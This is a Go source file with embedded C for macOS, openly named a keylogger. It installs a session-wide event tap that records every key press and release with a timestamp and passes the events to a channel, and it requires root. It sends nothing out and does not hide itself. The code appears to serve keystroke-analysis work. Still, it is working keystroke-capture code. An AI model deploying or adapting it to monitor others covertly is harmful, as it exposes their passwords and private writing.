package osxkeylogger

import (
	"log"
	"os/user"
	"time"

	"github.com/rikonor/keysig/keylogger/keyboard"
)

// Based on github.com/caseyscarborough/keylogger

/*
#cgo LDFLAGS: -framework ApplicationServices -framework Carbon
#include "keylogger.h"

typedef enum State { Invalid, Down, Up } State;

extern void handleButtonEvent(int k, State s);

static inline void start_logger() {
    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = (
        CGEventMaskBit(kCGEventKeyDown) |
        CGEventMaskBit(kCGEventKeyUp) |
        CGEventMaskBit(kCGEventFlagsChanged)
    );
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if(!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    CFRunLoopRun();
}

// The following callback method is invoked on every keypress.
static inline CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }

    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

		State s;
		if (type == kCGEventKeyDown) s = Down;
		if (type == kCGEventKeyUp) s = Up;
		if (type == kCGEventFlagsChanged) s = Invalid;

		handleButtonEvent((int)keyCode, s);

		return event;
}
*/
import "C"

var globalOutputChannel *chan keyboard.ButtonEvent
var pressedKeys = make(map[keyboard.Key]bool)

//export handleButtonEvent
func handleButtonEvent(keyCode C.int, stateCode C.State) {
	k := convertKeyCode(int(keyCode))
	// Skip invalid keys
	if k == keyboard.Invalid {
		return
	}

	s := convertStateCode(int(stateCode))

	// Dedup still-pressed keys
	if _, ok := pressedKeys[k]; (s == keyboard.Down) && ok {
		return
	}
	if s == keyboard.Down {
		pressedKeys[k] = true
	}
	if s == keyboard.Up {
		delete(pressedKeys, k)
	}

	evt := keyboard.ButtonEvent{
		T:     time.Now(),
		Key:   k,
		State: s,
	}

	*globalOutputChannel <- evt
}

type OSXKeylogger struct {
	outputChannel *chan keyboard.ButtonEvent
}

func NewOSXKeylogger(outputChannel *chan keyboard.ButtonEvent) *OSXKeylogger {
	// Ensure keylogger is running as root, otherwise no key events will be captured
	u, err := user.Current()
	if err != nil {
		log.Fatalln("Failed to check root status:", err)
	}
	if u.Username != "root" {
		log.Fatalln("Non-root user detected. Key events will not be captured. Aborting..")
	}

	// Assign the global outputChannel
	globalOutputChannel = outputChannel
	return &OSXKeylogger{outputChannel: outputChannel}
}

func (k *OSXKeylogger) Start() {
	C.start_logger()
}
